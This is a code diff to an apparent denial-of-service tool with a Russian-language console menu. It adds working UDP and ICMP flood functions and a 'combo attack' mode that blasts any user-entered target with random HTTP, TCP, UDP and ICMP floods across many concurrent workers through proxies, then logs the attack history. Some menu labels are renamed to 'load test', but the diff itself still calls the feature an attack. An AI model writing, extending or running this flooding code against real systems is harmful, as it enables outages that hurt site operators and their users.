@@ -7,6 +7,7 @@ import asyncio
 import aiohttp
 import socket
 import logging
+import threading
 from datetime import datetime
 
 # ================= CONSOLE SETUP =================
@@ -138,6 +139,28 @@ async def tcp_flood(ip, port):
     except:
         return False
 
+# ================= UDP =================
+async def udp_flood(ip, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = os.urandom(65500)
+        sock.sendto(packet, (ip, port))
+        sock.close()
+        return True
+    except:
+        return False
+
+# ================= ICMP =================
+async def icmp_flood(ip):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + os.urandom(56)
+        sock.sendto(packet, (ip, 0))
+        sock.close()
+        return True
+    except:
+        return False
+
 # ================= SAFE INPUT =================
 def safe_int(prompt, default=100, min_val=1, max_val=1000):
     while True:
@@ -152,20 +175,19 @@ def safe_int(prompt, default=100, min_val=1, max_val=1000):
             pass
 
 # ================= ПРОГРЕСС-БАР =================
-def draw_progress_bar(percent, width=30, color_start=G7, color_end=Red):
-    """Рисует прогресс-бар с цветным градиентом"""
+def draw_progress_bar(percent, width=30):
+    percent = max(0, min(100, percent))
     filled = int(width * percent / 100)
     empty = width - filled
     
-    # Выбираем цвет в зависимости от процента
     if percent < 30:
-        bar_color = Green
+        color = Green
     elif percent < 70:
-        bar_color = Yellow
+        color = Yellow
     else:
-        bar_color = Red
+        color = Red
     
-    bar = bar_color + '█' * filled + Reset + '░' * empty
+    bar = color + '█' * filled + Reset + '░' * empty
     return f"[{bar}] {percent}%"
 
 # ================= LOAD TESTER =================
@@ -298,6 +320,65 @@ class LoadTester:
 
         await asyncio.gather(*tasks, return_exceptions=True)
 
+    async def start_combo(self, target, threads):
+        try:
+            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
+            port = 443 if target.startswith('https://') else 80
+        except:
+            return
+
+        self.running = True
+        self.requests = self.success = self.errors = self.banned = 0
+        self.start_time = time.time()
+        self.load_proxies()
+
+        sem = asyncio.Semaphore(threads)
+
+        async def worker():
+            while self.running:
+                async with sem:
+                    attack_type = random.choice(['http', 'tcp', 'udp', 'icmp'])
+                    
+                    if attack_type == 'http':
+                        await self.http_test(target)
+                    elif attack_type == 'tcp':
+                        if await tcp_flood(ip, port):
+                            async with self.lock:
+                                self.requests += 1
+                                self.success += 1
+                        else:
+                            async with self.lock:
+                                self.requests += 1
+                                self.errors += 1
+                    elif attack_type == 'udp':
+                        if await udp_flood(ip, port):
+                            async with self.lock:
+                                self.requests += 1
+                                self.success += 1
+                        else:
+                            async with self.lock:
+                                self.requests += 1
+                                self.errors += 1
+                    elif attack_type == 'icmp':
+                        if await icmp_flood(ip):
+                            async with self.lock:
+                                self.requests += 1
+                                self.success += 1
+                        else:
+                            async with self.lock:
+                                self.requests += 1
+                                self.errors += 1
+                        
+                    await asyncio.sleep(random.uniform(0.001, 0.01))
+
+        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
+
+        if CONFIG["max_duration"] > 0:
+            await asyncio.sleep(CONFIG["max_duration"])
+            self.running = False
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+
     def stop(self):
         self.running = False
         if self.session:
@@ -325,15 +406,16 @@ class UI:
         print(f"""
 {G7}ГЛАВНОЕ МЕНЮ
 
-{G7}1.{w} DDos Ip Address
-{G6}2.{w} View Url Ip Address
+{G7}1.{w} HTTP Load Test
+{G6}2.{w} TCP Load Test
 {G5}3.{w} DDos site logs
 {G4}4.{w} Proxy Management
 {G3}5.{w} Total Statistics
 {G2}6.{w} History
 {G1}7.{w} Settings
 {G7}8.{w} INFO — инструкция по использованию
-{G6}99.{w} Exit
+{G6}9.{w} Combo Attack (HTTP+TCP+UDP+ICMP) {Red}🔥 NEW{Reset}
+{G7}99.{w} Exit
 {Reset}
 """)
 
@@ -343,15 +425,16 @@ class UI:
         print(f"""
 {G7}ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ
 
-{G7}1.{w} DDOS IP ADDRESS — HTTP/HTTPS флуд по IP
-{G6}2.{w} VIEW URL IP ADDRESS — TCP-флуд по URL
+{G7}1.{w} HTTP LOAD TEST — HTTP/HTTPS нагрузка
+{G6}2.{w} TCP LOAD TEST — TCP-нагрузка
 {G5}3.{w} DDOS SITE LOGS — логи атак
 {G4}4.{w} PROXY MANAGEMENT — управление прокси
 {G3}5.{w} TOTAL STATISTICS — общая статистика
 {G2}6.{w} HISTORY — история атак
 {G1}7.{w} SETTINGS — настройки
 {G7}8.{w} INFO — эта инструкция
-{G6}99.{w} EXIT — выход
+{G6}9.{w} COMBO ATTACK — HTTP+TCP+UDP+ICMP одновременно
+{G7}99.{w} EXIT — выход
 {Reset}
 """)
         input(f"{G7}Нажми ENTER для возврата...{Reset}")
@@ -504,9 +587,8 @@ class UI:
     def attack_progress(self, url, threads, t, attack_type="HTTP"):
         elapsed = int(time.time() - t.start_time)
         rate = int(t.requests / elapsed) if elapsed > 0 else 0
-        load = min(100, int((rate / 15) * 100) // 1)  # Более точный расчёт
-        
-        # Рисуем прогресс-бар
+        max_rate = threads * 10
+        load = min(100, int((rate / max_rate) * 100)) if max_rate > 0 else 0
         bar = draw_progress_bar(load)
         
         stats = load_stats()
@@ -553,6 +635,8 @@ class UI:
                 self.menu = 'settings'
             elif choice == '8':
                 self.menu = 'info'
+            elif choice == '9':
+                asyncio.run(self.combo_test())
             elif choice == '99':
                 self.running = False
         elif choice.lower() == 'back':
@@ -572,9 +656,21 @@ class UI:
         t = LoadTester()
         task = asyncio.create_task(t.start_http(url, threads))
         
-        while t.running:
-            self.attack_progress(url, threads, t, "HTTP")
-            await asyncio.sleep(0.3)
+        stop_flag = [False]
+        
+        def wait_enter():
+            input()
+            stop_flag[0] = True
+        
+        enter_thread = threading.Thread(target=wait_enter, daemon=True)
+        enter_thread.start()
+        
+        try:
+            while t.running and not stop_flag[0]:
+                self.attack_progress(url, threads, t, "HTTP")
+                await asyncio.sleep(0.3)
+        except KeyboardInterrupt:
+            pass
         
         t.stop()
         await task
@@ -626,9 +722,21 @@ class UI:
         t = LoadTester()
         task = asyncio.create_task(t.start_tcp(url, threads))
         
-        while t.running:
-            self.attack_progress(url, threads, t, "TCP")
-            await asyncio.sleep(0.3)
+        stop_flag = [False]
+        
+        def wait_enter():
+            input()
+            stop_flag[0] = True
+        
+        enter_thread = threading.Thread(target=wait_enter, daemon=True)
+        enter_thread.start()
+        
+        try:
+            while t.running and not stop_flag[0]:
+                self.attack_progress(url, threads, t, "TCP")
+                await asyncio.sleep(0.3)
+        except KeyboardInterrupt:
+            pass
         
         t.stop()
         await task
@@ -653,6 +761,73 @@ class UI:
         banner()
         print(f"""
 {G7}АТАКА ЗАВЕРШЕНА
+
+{G7}Запросы: {w}{t.requests:,}
+{G6}Успешно: {Green}{t.success:,}{Reset}
+{G5}Ошибки : {Red}{t.errors:,}{Reset}
+{G4}Бан    : {Red}{t.banned}{Reset}
+{G3}Время  : {w}{elapsed} сек
+{G2}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
+{G7}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{G6}Всего атак за сессию: {w}{load_stats()['attacks']}
+{Reset}
+""")
+        input(f"{G7}Нажми ENTER для возврата в меню...{Reset}")
+
+    async def combo_test(self):
+        self.clear()
+        self.header()
+        print(f"{G7}КОМБО-АТАКА — HTTP + TCP + UDP + ICMP{Reset}")
+        
+        url = input(f"{G7}Цель: {w}")
+        if not url.startswith('http'):
+            url = 'http://' + url
+        
+        threads = safe_int(f"{G7}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
+        
+        t = LoadTester()
+        task = asyncio.create_task(t.start_combo(url, threads))
+        
+        stop_flag = [False]
+        
+        def wait_enter():
+            input()
+            stop_flag[0] = True
+        
+        enter_thread = threading.Thread(target=wait_enter, daemon=True)
+        enter_thread.start()
+        
+        try:
+            while t.running and not stop_flag[0]:
+                self.attack_progress(url, threads, t, "COMBO")
+                await asyncio.sleep(0.3)
+        except KeyboardInterrupt:
+            pass
+        
+        t.stop()
+        await task
+        
+        elapsed = int(time.time() - t.start_time)
+        entry = {
+            "target": url, "threads": threads, "duration": elapsed,
+            "requests": t.requests, "success": t.success, "errors": t.errors,
+            "banned": t.banned, "bytes_sent": t.bytes_sent,
+            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
+            "timestamp": datetime.now().isoformat(),
+            "type": "combo"
+        }
+        save_history(entry)
+        s = load_stats()
+        s["attacks"] += 1
+        s["requests"] += t.requests
+        s["success"] += t.success
+        s["errors"] += t.errors
+        save_stats(s)
+        
+        clear()
+        banner()
+        print(f"""
+{G7}КОМБО-АТАКА ЗАВЕРШЕНА
 
 {G7}Запросы: {w}{t.requests:,}
 {G6}Успешно: {Green}{t.success:,}{Reset}
